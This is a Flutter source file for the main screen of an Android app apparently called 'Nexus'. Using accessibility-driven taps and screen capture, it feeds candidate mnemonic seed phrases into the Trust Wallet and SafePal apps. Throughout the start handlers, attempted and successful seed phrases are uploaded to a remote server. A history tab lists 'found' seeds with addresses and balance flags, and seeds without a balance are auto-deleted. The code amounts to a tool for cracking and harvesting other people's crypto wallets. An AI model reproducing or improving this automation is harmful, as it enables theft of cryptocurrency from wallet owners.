import 'dart:async';

import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

import '../api/server_api.dart';
import '../theme/app_theme.dart';
import '../services/app_launcher.dart';
import '../services/automation_runner.dart';
import '../services/automation_log_file.dart';
import '../services/wallet_count_file.dart';
import '../services/android_image_matcher.dart';

/// 모바일 전용 메인 화면 - Trust Wallet 실행 + 이미지 인식 자동화
class MainScreen extends StatefulWidget {
  const MainScreen({super.key});

  @override
  State<MainScreen> createState() => _MainScreenState();
}

class _MainScreenState extends State<MainScreen> with WidgetsBindingObserver {
  final _logController = ScrollController();
  final List<String> _logLines = [];
  bool _running = false;
  int _walletCount = 0;
  Timer? _sessionTimer;
  String _expiryText = '만료일: -';
  Color _expiryColor = AppTheme.logRed;
  bool _hasScreenPermission = false;
  bool _hasTouchPermission = false;
  String _templatePath = '';
  final _passwordController = TextEditingController();
  final _nodeTestController = TextEditingController(text: 'Import');
  bool _saveStepRecord = false;
  bool _nodeCollectorRunning = false;
  int _nodeCollectorCount = 0;
  Timer? _collectorStatusTimer;

  // 히스토리 탭 상태
  int _currentTabIndex = 0; // 0=자동화, 1=히스토리
  final ScrollController _historyScrollController = ScrollController();
  final List<SeedHistoryItem> _historyItems = [];
  int _historyPage = 1;
  bool _historyHasNext = true;
  bool _historyLoading = false;
  String? _historyError;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _refreshExpiry();
    _refreshWalletCount();
    _checkPermissions();
    if (ServerApi.enabled && ServerApi.currentToken != null && ServerApi.currentToken!.isNotEmpty) {
      _sessionTimer = Timer.periodic(const Duration(seconds: 15), (_) => _validateSession());
    }
    WidgetsBinding.instance.addPostFrameCallback((_) => _requestPermissionsOnStart());
    _collectorStatusTimer = Timer.periodic(const Duration(seconds: 1), (_) => _refreshNodeCollectorStatus());

    _historyScrollController.addListener(_onHistoryScroll);
  }

  Future<void> _refreshNodeCollectorStatus() async {
    final running = await AndroidImageMatcher.isNodeCollectorRunning();
    final count = await AndroidImageMatcher.getNodeCollectorCount();
    if (mounted && (_nodeCollectorRunning != running || _nodeCollectorCount != count)) {
      setState(() {
        _nodeCollectorRunning = running;
        _nodeCollectorCount = count;
      });
    }
  }

  Future<void> _onStartNodeCollector() async {
    final ok = await AndroidImageMatcher.startNodeCollector();
    if (!mounted) return;
    _appendLog(ok ? '수집 모드 시작 → Trust Wallet으로 전환하세요' : '수집 모드 시작 실패', red: !ok);
    await _refreshNodeCollectorStatus();
  }

  /// 시드 스캔: SafePal 실행 후 노드 수집 시작 (io.safepal.wallet)
  Future<void> _onStartSafePalSeedScan() async {
    final launched = await AppLauncher.launchSafePal();
    if (!mounted) return;
    if (!launched) {
      _appendLog('SafePal 앱을 찾을 수 없습니다. (io.safepal.wallet)', red: true);
      return;
    }
    _appendLog('SafePal 실행됨 → 시드 스캔(노드 수집) 시작');
    await Future.delayed(const Duration(milliseconds: 800));
    final ok = await AndroidImageMatcher.startNodeCollector();
    if (!mounted) return;
    _appendLog(ok ? '시드 스캔 시작 → SafePal 화면에서 5초마다 노드 수집됨' : '시드 스캔 시작 실패', red: !ok);
    await _refreshNodeCollectorStatus();
  }

  Future<void> _onStopNodeCollector() async {
    await AndroidImageMatcher.stopNodeCollector();
    if (mounted) await _refreshNodeCollectorStatus();
  }

  /// 앱 시작 시 권한 자동 요청
  Future<void> _requestPermissionsOnStart() async {
    try {
      final hasTouch = await AndroidImageMatcher.hasTouchPermission();
      if (!hasTouch) {
        await AndroidImageMatcher.requestTouchPermission();
      }
      await _checkPermissions();
    } catch (_) {}
  }

  Future<void> _checkPermissions() async {
    final touch = await AndroidImageMatcher.hasTouchPermission();
    final path = await AndroidImageMatcher.picsDir;
    if (!mounted) return;
    setState(() {
      _hasTouchPermission = touch;
      _templatePath = path;
    });
  }

  Future<void> _validateSession() async {
    final token = ServerApi.currentToken;
    if (token == null || token.isEmpty) return;
    final valid = await ServerApi.validateSessionAsync(token);
    if (valid) return;
    _sessionTimer?.cancel();
    if (!mounted) return;
    _appendLog('세션 만료. 프로그램을 종료합니다.');
    Navigator.of(context).pushNamedAndRemoveUntil('/login', (r) => false);
  }

  void _refreshExpiry() {
    final exp = ServerApi.subscriptionExpiry;
    if (exp == null) {
      setState(() {
        _expiryText = '사용기간: 없음';
        _expiryColor = AppTheme.logRed;
      });
      return;
    }
    final local = exp.toLocal();
    final dateStr = '${local.year}-${local.month.toString().padLeft(2, '0')}-${local.day.toString().padLeft(2, '0')}';
    setState(() {
      _expiryText = '만료일: $dateStr';
      _expiryColor = ServerApi.isSubscriptionValid() ? AppTheme.accent : AppTheme.logRed;
    });
  }

  Future<void> _refreshWalletCount() async {
    final n = await WalletCountFile.read();
    if (!mounted) return;
    setState(() => _walletCount = n);
  }

  void _appendLog(String text, {bool red = false}) {
    debugPrint(text);
    AutomationLogFile.append(text).catchError((_) {});
    if (!mounted) return;
    setState(() {
      _logLines.add(text);
      // 메모리 사용 제한: 오래 실행될 때를 대비해 최근 N줄만 유지
      const maxLogLines = 2000;
      if (_logLines.length > maxLogLines) {
        _logLines.removeRange(0, _logLines.length - maxLogLines);
      }
      WidgetsBinding.instance.addPostFrameCallback((_) {
        if (mounted && _logController.hasClients) {
          _logController.animateTo(
            _logController.position.maxScrollExtent,
            duration: const Duration(milliseconds: 100),
            curve: Curves.easeOut,
          );
        }
      });
    });
  }

  Future<void> _onRequestScreenPermission() async {
    try {
      await AndroidImageMatcher.requestScreenPermission();
      if (!mounted) return;
      _appendLog('→ 시스템 팝업이 뜨면 반드시 "시작" 버튼을 눌러 허용하세요.');
    } catch (e) {
      if (!mounted) return;
      _appendLog('캡처 권한 요청 오류: $e', red: true);
    }
  }

  Future<void> _onRequestTouchPermission() async {
    await AndroidImageMatcher.requestTouchPermission();
    if (!mounted) return;
    _appendLog('설정에서 Nexus 접근성 서비스를 활성화해주세요');
    await _checkPermissions();
  }

  /// 터치만 검증 (캡처/매칭 없이) — 원인 파악용
  Future<void> _onTouchTest() async {
    final hasTouch = await AndroidImageMatcher.hasTouchPermission();
    if (!hasTouch) {
      _appendLog('터치 테스트: 접근성 권한 없음. 먼저 접근성을 켜주세요.', red: true);
      return;
    }
    AndroidImageMatcher.debugLog = (t) => _appendLog(t);
    _appendLog('--- 터치 테스트: 화면 중앙(540,1200) 한 번 탭 ---');
    final ok = await AndroidImageMatcher.testTouchAt(540, 1200);
    AndroidImageMatcher.debugLog = null;
    if (!mounted) return;
    if (ok) {
      _appendLog('터치 테스트: 전송결과 true → 터치 동작함. 문제는 캡처/매칭 쪽일 수 있음.');
    } else {
      _appendLog('터치 테스트: 전송결과 false → 터치(접근성) 쪽 문제 가능.', red: true);
    }
  }

  /// 캡처만 검증 (매칭/터치 없이) — 원인 파악용
  /// 원리: 권한 없이 takeCapture() 호출 시 MediaProjection 세션 없음 → 네이티브에서 크래시 → 먼저 권한 요청 후 3초 대기했다가 테스트
  Future<void> _onCaptureTest() async {
    final doTest = await showDialog<bool>(
      context: context,
      builder: (ctx) => AlertDialog(
        title: const Text('캡처 테스트'),
        content: const Text(
          '화면캡처 권한이 없으면 앱이 꺼질 수 있습니다.\n\n'
          '다음 누르면 권한 팝업이 뜹니다. 팝업에서 반드시 "시작"을 누른 뒤, 3초 후 자동으로 캡처를 시도합니다.',
        ),
        actions: [
          TextButton(onPressed: () => Navigator.of(ctx).pop(false), child: const Text('취소')),
          TextButton(onPressed: () => Navigator.of(ctx).pop(true), child: const Text('다음')),
        ],
      ),
    );
    if (doTest != true || !mounted) return;
    AndroidImageMatcher.debugLog = (t) => _appendLog(t);
    _appendLog('--- 캡처 테스트 (팝업에서 "시작" 누르고 3초 대기) ---');
    await AndroidImageMatcher.requestScreenPermission();
    await Future.delayed(const Duration(seconds: 3));
    if (!mounted) return;
    _appendLog('캡처 시도 중...');
    bool ok = false;
    try {
      ok = await AndroidImageMatcher.testCapture();
    } catch (e, st) {
      _appendLog('캡처 테스트 예외: $e', red: true);
    }
    AndroidImageMatcher.debugLog = null;
    if (!mounted) return;
    if (ok) {
      setState(() => _hasScreenPermission = true);
      _appendLog('캡처 테스트: OK → 캡처 동작함.');
    } else {
      _appendLog('캡처 테스트: 실패. 팝업에서 "시작" 눌렀는지 확인 후 다시 시도.', red: true);
    }
  }

  Future<void> _onStart() async {
    if (_running) return;
    if (!ServerApi.isSubscriptionValid()) {
      if (!mounted) return;
      showDialog(
        context: context,
        builder: (ctx) => AlertDialog(
          title: const Text('이용기간'),
          content: const Text('이용기간이 없거나 만료되었습니다. 프로그램을 종료합니다.'),
          actions: [
            TextButton(
              onPressed: () {
                Navigator.of(ctx).pop();
                Navigator.of(context).popUntil((route) => route.isFirst);
              },
              child: const Text('확인'),
            ),
          ],
        ),
      );
      return;
    }

    final hasTouch = await AndroidImageMatcher.hasTouchPermission();
    if (!hasTouch) {
      if (!mounted) return;
      showDialog(
        context: context,
        builder: (ctx) => AlertDialog(
          title: const Text('접근성 권한 필요'),
          content: const Text(
            '설정 > 접근성에서 "nexus_flutter" 또는 "Nexus"를 찾아 스위치를 켜주세요.\n\n'
            '활성화 후 뒤로가기로 돌아오면 자동으로 인식됩니다.',
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.of(ctx).pop(),
              child: const Text('취소'),
            ),
            TextButton(
              onPressed: () async {
                Navigator.of(ctx).pop();
                await AndroidImageMatcher.requestTouchPermission();
              },
              child: const Text('설정 열기'),
            ),
          ],
        ),
      );
      return;
    }

    setState(() {
      _running = true;
      _logLines.clear();
    });
    await AutomationLogFile.clear();

    AutomationRunner.password = _passwordController.text.trim();
    AndroidImageMatcher.debugSaveCaptureAndLog = _saveStepRecord;

    final logDir = await AutomationLogFile.getLogDirectory();
    _appendLog('로그 폴더: $logDir');
    _appendLog('PC로 복사: adb -s <기기ID> pull $logDir C:\\Users\\alsdh\\OneDrive\\Desktop\\log');

    await AutomationRunner.run(
      logLine: (t) {
        if (mounted) _appendLog(t);
        else AutomationLogFile.append(t).catchError((_) {});
      },
      logLineRed: (t) {
        if (mounted) _appendLog(t, red: true);
        else AutomationLogFile.append(t).catchError((_) {});
      },
      addAttemptedPhrase: (p) {
        final token = ServerApi.currentToken;
        if (token != null && token.isNotEmpty) {
          ServerApi.sendSeedAsync(token, p);
        }
      },
      replaceLogLastLine: (t) {
        if (!mounted) return;
        setState(() {
          if (_logLines.isNotEmpty) _logLines.removeLast();
          _logLines.add(t);
        });
      },
      setClipboard: (t) => Clipboard.setData(ClipboardData(text: t)),
    );

    if (!mounted) return;
    setState(() {
      _running = false;
      _refreshWalletCount();
    });
  }

  Future<void> _onStartSafePal() async {
    if (_running) return;
    if (!ServerApi.isSubscriptionValid()) {
      if (!mounted) return;
      showDialog(
        context: context,
        builder: (ctx) => AlertDialog(
          title: const Text('이용기간'),
          content: const Text('이용기간이 없거나 만료되었습니다. 프로그램을 종료합니다.'),
          actions: [
            TextButton(
              onPressed: () {
                Navigator.of(ctx).pop();
                Navigator.of(context).popUntil((route) => route.isFirst);
              },
              child: const Text('확인'),
            ),
          ],
        ),
      );
      return;
    }

    final hasTouch = await AndroidImageMatcher.hasTouchPermission();
    if (!hasTouch) {
      if (!mounted) return;
      showDialog(
        context: context,
        builder: (ctx) => AlertDialog(
          title: const Text('접근성 권한 필요'),
          content: const Text(
            '설정 > 접근성에서 "nexus_flutter" 또는 "Nexus"를 찾아 스위치를 켜주세요.\n\n'
            '활성화 후 뒤로가기로 돌아오면 자동으로 인식됩니다.',
          ),
          actions: [
            TextButton(onPressed: () => Navigator.of(ctx).pop(), child: const Text('취소')),
            TextButton(
              onPressed: () async {
                Navigator.of(ctx).pop();
                await AndroidImageMatcher.requestTouchPermission();
              },
              child: const Text('설정 열기'),
            ),
          ],
        ),
      );
      return;
    }

    setState(() {
      _running = true;
      _logLines.clear();
    });
    await AutomationLogFile.clear();

    AutomationRunner.password = _passwordController.text.trim();
    AndroidImageMatcher.debugSaveCaptureAndLog = _saveStepRecord;

    final logDir = await AutomationLogFile.getLogDirectory();
    _appendLog('로그 폴더: $logDir');
    _appendLog('--- SafePal 플로우 (assets/app/first.png, errorword.png) ---');

    await AutomationRunner.runSafePal(
      logLine: (t) {
        if (mounted) {
          _appendLog(t);
        } else {
          AutomationLogFile.append(t).catchError((_) {});
        }
      },
      logLineRed: (t) {
        if (mounted) {
          _appendLog(t, red: true);
        } else {
          AutomationLogFile.append(t).catchError((_) {});
        }
      },
      onSuccessPhrase: (p) async {
        // SafePal은 "성공한" 니모닉만 서버로 전송
        final token = ServerApi.currentToken;
        if (token == null || token.isEmpty) {
          _appendLog('→ success 시드 발견 (토큰 없음, 서버 전송 생략)', red: true);
          return;
        }
        // 앞부분만 로그에 남겨서 실제 전송 여부를 눈으로 확인 가능하게 한다.
        final preview = p.split(' ').take(3).join(' ');
        _appendLog('→ success 시드 전송 요청: "$preview ..."');
        await ServerApi.sendSeedAsync(token, p);
      },
      replaceLogLastLine: (t) {
        if (!mounted) return;
        setState(() {
          if (_logLines.isNotEmpty) _logLines.removeLast();
          _logLines.add(t);
        });
      },
      setClipboard: (t) => Clipboard.setData(ClipboardData(text: t)),
    );

    if (!mounted) return;
    setState(() {
      _running = false;
      _refreshWalletCount();
    });
  }

  void _onStop() {
    if (!_running) return;
    AutomationRunner.requestStop();
    _appendLog('중지 요청');
  }

  /// SafePal 삭제 루프만 테스트 (first → select → delete1 → delete2 → 비밀번호)
  Future<void> _onSafePalDeleteTest() async {
    if (_running) return;
    final hasTouch = await AndroidImageMatcher.hasTouchPermission();
    if (!hasTouch) {
      if (!mounted) return;
      _appendLog('접근성 권한 필요.', red: true);
      return;
    }
    setState(() {
      _running = true;
      _logLines.clear();
    });
    AutomationRunner.password = _passwordController.text.trim();
    AndroidImageMatcher.debugLog = (t) => _appendLog(t);

    await AutomationRunner.runSafePalDeleteTest(
      logLine: (t) {
        if (mounted) _appendLog(t);
      },
      logLineRed: (t) {
        if (mounted) _appendLog(t, red: true);
      },
      count: AutomationRunner.testDeleteCount,
    );

    AndroidImageMatcher.debugLog = null;
    if (!mounted) return;
    setState(() => _running = false);
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) {
      _checkPermissions();
    }
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    _sessionTimer?.cancel();
    _collectorStatusTimer?.cancel();
    _logController.dispose();
    _historyScrollController.dispose();
    _passwordController.dispose();
    _nodeTestController.dispose();
    super.dispose();
  }

  Future<void> _onNodeClickTest() async {
    final text = _nodeTestController.text.trim();
    if (text.isEmpty) return;
    final ok = await AndroidImageMatcher.clickByAccessibilityText(text);
    if (!mounted) return;
    _appendLog(ok ? '노드 클릭 "$text": 성공' : '노드 클릭 "$text": 실패 (해당 텍스트 없음)', red: !ok);
  }

  /// UIAutomator 선택자용: resourceId | text | contentDesc 목록 (노드 상세)
  Future<void> _onShowNodeDetails() async {
    final hasTouch = await AndroidImageMatcher.hasTouchPermission();
    if (!hasTouch) {
      _appendLog('접근성 권한 필요.', red: true);
      return;
    }
    final list = await AndroidImageMatcher.getNodeDetailsForSelectors();
    if (!mounted) return;
    final text = list.isEmpty
        ? '목록 없음.\n\n'
          '• 지금은 Nexus 화면 → Nexus 노드만 수집됩니다.\n'
          '• Trust Wallet 노드: "수집 모드"로 전환 후 Trust Wallet 화면에서 자동 수집.\n'
          '• 저장 위치: log 폴더 (nodes_collected.txt)'
        : list.join('\n');
    showDialog(
      context: context,
      builder: (ctx) => AlertDialog(
        title: const Text('노드 상세 (선택자용)'),
        content: SingleChildScrollView(
          child: SelectableText(text, style: const TextStyle(fontSize: 11, fontFamily: 'monospace')),
        ),
        actions: [TextButton(onPressed: () => Navigator.pop(ctx), child: const Text('닫기'))],
      ),
    );
  }

  /// 현재 화면(Trust Wallet 등)의 버튼/텍스트 목록 보기 → accessibilityTextMap 채울 때 참고
  Future<void> _onShowNodeTexts() async {
    final hasTouch = await AndroidImageMatcher.hasTouchPermission();
    if (!hasTouch) {
      _appendLog('접근성 권한 필요.', red: true);
      return;
    }
    final list = await AndroidImageMatcher.getAccessibilityNodeTexts();
    if (!mounted) return;
    final text = list.isEmpty
        ? '목록 없음. Trust Wallet 화면을 연 상태에서 다시 누르세요.'
        : list.join('\n');
    showDialog(
      context: context,
      builder: (ctx) => AlertDialog(
        title: const Text('현재 화면 노드 텍스트'),
        content: SingleChildScrollView(
          child: SelectableText(text, style: const TextStyle(fontSize: 12)),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.of(ctx).pop(),
            child: const Text('닫기'),
          ),
        ],
      ),
    );
  }

  void _onHistoryScroll() {
    if (!_historyHasNext || _historyLoading) return;
    if (!_historyScrollController.hasClients) return;
    final pos = _historyScrollController.position;
    if (pos.pixels >= pos.maxScrollExtent - 200) {
      _loadMoreHistory();
    }
  }

  Future<void> _loadMoreHistory({bool reset = false}) async {
    final token = ServerApi.currentToken;
    if (token == null || token.isEmpty) return;
    if (reset) {
      setState(() {
        _historyItems.clear();
        _historyPage = 1;
        _historyHasNext = true;
        _historyError = null;
      });
    }
    if (!_historyHasNext || _historyLoading) return;
    setState(() {
      _historyLoading = true;
      _historyError = null;
    });
    final nextPage = _historyPage;
    final page = await ServerApi.getSeedHistory(token: token, page: nextPage, pageSize: 30);
    if (!mounted) return;
    setState(() {
      _historyLoading = false;
      if (page == null) {
        _historyError = '히스토리를 불러오지 못했습니다.';
        return;
      }
      _historyPage = nextPage + 1;
      _historyHasNext = page.hasNext;
      _historyItems.addAll(page.items);
    });
  }

  void _onTabChanged(int index) {
    setState(() {
      _currentTabIndex = index;
    });
    if (index == 1 && _historyItems.isEmpty) {
      _loadMoreHistory(reset: true);
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: AppTheme.bgDark,
      appBar: AppBar(
        title: const Text('Nexus'),
      ),
      body: AnimatedSwitcher(
        duration: const Duration(milliseconds: 220),
        switchInCurve: Curves.easeOut,
        switchOutCurve: Curves.easeIn,
        child: _currentTabIndex == 0
            ? _buildAutomationBody()
            : _buildHistoryBody(),
      ),
      bottomNavigationBar: BottomNavigationBar(
        currentIndex: _currentTabIndex,
        onTap: _onTabChanged,
        items: const [
          BottomNavigationBarItem(icon: Icon(Icons.play_arrow_rounded), label: '자동화'),
          BottomNavigationBarItem(icon: Icon(Icons.history_rounded), label: '기록'),
        ],
      ),
    );
  }

  Widget _buildAutomationBody() {
    return Column(
      children: [
        Padding(
          padding: const EdgeInsets.fromLTRB(16, 10, 16, 8),
          child: Card(
            child: Padding(
              padding: const EdgeInsets.fromLTRB(16, 16, 16, 14),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    _expiryText,
                    style: TextStyle(color: _expiryColor, fontSize: 13, fontWeight: FontWeight.w500),
                  ),
                  const SizedBox(height: 4),
                  Text(
                    '니모닉 시도: $_walletCount회',
                    style: const TextStyle(color: AppTheme.muted, fontSize: 12),
                  ),
                  const SizedBox(height: 12),
                  Row(
                    children: [
                      const Text(
                        '지갑 비밀번호',
                        style: TextStyle(color: AppTheme.fg, fontSize: 13, fontWeight: FontWeight.w500),
                      ),
                      const SizedBox(width: 10),
                      Expanded(
                        child: TextField(
                          controller: _passwordController,
                          obscureText: true,
                          decoration: const InputDecoration(
                            hintText: 'Trust Wallet / SafePal 비밀번호',
                          ),
                        ),
                      ),
                    ],
                  ),
                // if (_templatePath.isNotEmpty)
                //   Padding(
                //     padding: const EdgeInsets.only(top: 4),
                //     child: Text('템플릿: $_templatePath', style: TextStyle(color: AppTheme.muted, fontSize: 11), maxLines: 2, overflow: TextOverflow.ellipsis),
                //   ),
                // const SizedBox(height: 4),
                // Text('클릭 방식: 캡처 → 이미지 매칭(first.png 등) → 해당 위치 터치. 팝업 뜨면 "시작" 눌러 허용.', style: TextStyle(color: AppTheme.muted, fontSize: 11)),
                // Row(
                //   children: [
                //     SizedBox(
                //       width: 24,
                //       height: 24,
                //       child: Checkbox(
                //         value: _saveStepRecord,
                //         onChanged: _running ? null : (v) => setState(() => _saveStepRecord = v ?? false),
                //         materialTapTargetSize: MaterialTapTargetSize.shrinkWrap,
                //       ),
                //     ),
                //     const SizedBox(width: 4),
                //     Text('단계별 캡처/클릭 기록 (log 폴더)', style: TextStyle(color: AppTheme.muted, fontSize: 11)),
                //   ],
                // ),
                  const SizedBox(height: 14),
                  Row(
                    children: [
                      Expanded(
                        child: ElevatedButton(
                          onPressed: _running ? null : _onStartSafePal,
                          child: const Text('시작 (SafePal)'),
                        ),
                      ),
                      const SizedBox(width: 10),
                      Expanded(
                        child: OutlinedButton(
                          onPressed: _running ? _onStop : null,
                          style: OutlinedButton.styleFrom(
                            foregroundColor: AppTheme.fg,
                            side: BorderSide(color: AppTheme.buttonStopBg),
                            shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(14),
                            ),
                          ),
                          child: const Text('중지'),
                        ),
                      ),
                    ],
                  ),
                ],
              ),
            ),
          ),
        ),
        Expanded(
          child: Padding(
            padding: const EdgeInsets.fromLTRB(12, 0, 12, 8),
            child: Container(
              decoration: BoxDecoration(
                color: AppTheme.bgPanel,
                borderRadius: BorderRadius.circular(18),
              ),
              child: ListView.builder(
                controller: _logController,
                padding: const EdgeInsets.all(12),
                itemCount: _logLines.length,
                itemBuilder: (_, i) {
                  final line = _logLines[i];
                  final isRed = line.startsWith('오류') ||
                      line.contains('실패') ||
                      line.contains('찾을 수 없습니다') ||
                      line.contains('권한');
                  return Padding(
                    padding: const EdgeInsets.symmetric(vertical: 2),
                    child: SelectableText(
                      line,
                      style: TextStyle(
                        fontFamily: 'monospace',
                        fontSize: 12,
                        color: isRed ? AppTheme.logRed : AppTheme.accent,
                      ),
                    ),
                  );
                },
              ),
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildHistoryBody() {
    final items = _historyItems;
    return Column(
      children: [
        Container(
          padding: const EdgeInsets.fromLTRB(12, 8, 12, 8),
          color: AppTheme.bgPanel,
          child: const Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text(
                '내가 찾은 시드 히스토리',
                style: TextStyle(color: AppTheme.fg, fontSize: 14, fontWeight: FontWeight.bold),
              ),
              SizedBox(height: 2),
              Text(
                '※ 잔고가 없는 시드는 24시간 후 자동 삭제됩니다.',
                style: TextStyle(color: AppTheme.logRed, fontSize: 11),
              ),
            ],
          ),
        ),
        Expanded(
          child: Container(
            margin: const EdgeInsets.all(8),
            color: const Color(0xFF1C1C1C),
            child: items.isEmpty && _historyLoading
                ? const Center(child: CircularProgressIndicator())
                : items.isEmpty
                    ? Center(
                        child: Text(
                          _historyError ?? '아직 전송된 시드가 없습니다.',
                          style: const TextStyle(color: AppTheme.muted),
                        ),
                      )
                    : ListView.builder(
                        controller: _historyScrollController,
                        padding: const EdgeInsets.all(8),
                        itemCount: items.length + (_historyHasNext ? 1 : 0),
                        itemBuilder: (context, index) {
                          if (index >= items.length) {
                            return Padding(
                              padding: const EdgeInsets.symmetric(vertical: 8),
                              child: Center(
                                child: _historyLoading
                                    ? const CircularProgressIndicator(strokeWidth: 2)
                                    : const Text('더 불러오는 중...', style: TextStyle(color: AppTheme.muted)),
                              ),
                            );
                          }
                          final item = items[index];
                          return Card(
                            color: const Color(0xFF262626),
                            margin: const EdgeInsets.symmetric(vertical: 4),
                            child: ListTile(
                              onTap: () {
                                Clipboard.setData(ClipboardData(text: item.phrase));
                                ScaffoldMessenger.of(context).showSnackBar(
                                  const SnackBar(
                                    content: Text('시드 문구가 클립보드에 복사되었습니다.'),
                                    duration: Duration(seconds: 2),
                                  ),
                                );
                              },
                              title: Text(
                                item.phrasePreview,
                                style: const TextStyle(color: AppTheme.fg, fontSize: 13),
                              ),
                              subtitle: Column(
                                crossAxisAlignment: CrossAxisAlignment.start,
                                children: [
                                  const SizedBox(height: 2),
                                  Text(
                                    item.phrase,
                                    style: const TextStyle(color: AppTheme.muted, fontSize: 11),
                                  ),
                                  const SizedBox(height: 2),
                                  Text(
                                    '${item.source} • ${item.network} • ${item.hasBalance ? "잔고 있음" : "잔고 없음"}',
                                    style: TextStyle(
                                      color: item.hasBalance ? AppTheme.accent : AppTheme.muted,
                                      fontSize: 11,
                                    ),
                                  ),
                                  if (item.address != null && item.address!.isNotEmpty)
                                    Text(
                                      item.address!,
                                      style: const TextStyle(color: AppTheme.muted, fontSize: 11),
                                    ),
                                ],
                              ),
                              trailing: Text(
                                '${item.createdAt.hour.toString().padLeft(2, '0')}:${item.createdAt.minute.toString().padLeft(2, '0')}',
                                style: const TextStyle(color: AppTheme.muted, fontSize: 11),
                              ),
                            ),
                          );
                        },
                      ),
          ),
        ),
      ],
    );
  }
}
